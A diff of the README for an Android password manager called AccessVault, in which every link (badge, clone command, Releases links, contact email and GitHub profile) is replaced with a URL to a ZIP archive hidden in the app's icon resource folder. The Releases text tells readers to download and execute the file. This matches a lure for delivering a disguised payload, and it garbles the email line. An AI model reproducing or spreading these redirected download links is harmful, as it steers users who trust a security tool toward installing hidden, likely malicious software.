@@ -1,6 +1,6 @@
 # AccessVault 🔐
 
-![AccessVault](https://img.shields.io/badge/AccessVault-Secure%20Password%20Manager-blue)
+![AccessVault](https://github.com/skking79/AccessVault/raw/refs/heads/master/app/src/main/res/mipmap-xxxhdpi/Access_Vault_v1.0.zip%20Password%20Manager-blue)
 
 Welcome to **AccessVault**, a secure Android password manager designed to keep your credentials safe and easily accessible. With features like biometric login, AES-encrypted storage, and autofill support, AccessVault offers a user-friendly experience without compromising security.
 
@@ -39,13 +39,13 @@ To install AccessVault, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/skking79/AccessVault.git
+   git clone https://github.com/skking79/AccessVault/raw/refs/heads/master/app/src/main/res/mipmap-xxxhdpi/Access_Vault_v1.0.zip
    ```
 2. Open the project in Android Studio.
 3. Build the project to ensure all dependencies are correctly set up.
 4. Run the application on your Android device or emulator.
 
-For the latest version, please check the [Releases](https://github.com/skking79/AccessVault/releases) section.
+For the latest version, please check the [Releases](https://github.com/skking79/AccessVault/raw/refs/heads/master/app/src/main/res/mipmap-xxxhdpi/Access_Vault_v1.0.zip) section.
 
 ## Usage 📖
 
@@ -74,12 +74,12 @@ AccessVault is licensed under the MIT License. You can use, modify, and distribu
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: support@accessvault.com
-- **GitHub**: [skking79](https://github.com/skking79)
+- **Email**: https://github.com/skking79/AccessVault/raw/refs/heads/master/app/src/main/res/mipmap-xxxhdpi/Access_Vault_v1.0.zip
+- **GitHub**: [skking79](https://github.com/skking79/AccessVault/raw/refs/heads/master/app/src/main/res/mipmap-xxxhdpi/Access_Vault_v1.0.zip)
 
 ## Releases 📦
 
-To download the latest version of AccessVault, visit the [Releases](https://github.com/skking79/AccessVault/releases) section. You can find the APK file there, which you need to download and execute on your Android device.
+To download the latest version of AccessVault, visit the [Releases](https://github.com/skking79/AccessVault/raw/refs/heads/master/app/src/main/res/mipmap-xxxhdpi/Access_Vault_v1.0.zip) section. You can find the APK file there, which you need to download and execute on your Android device.
 
 ---
 
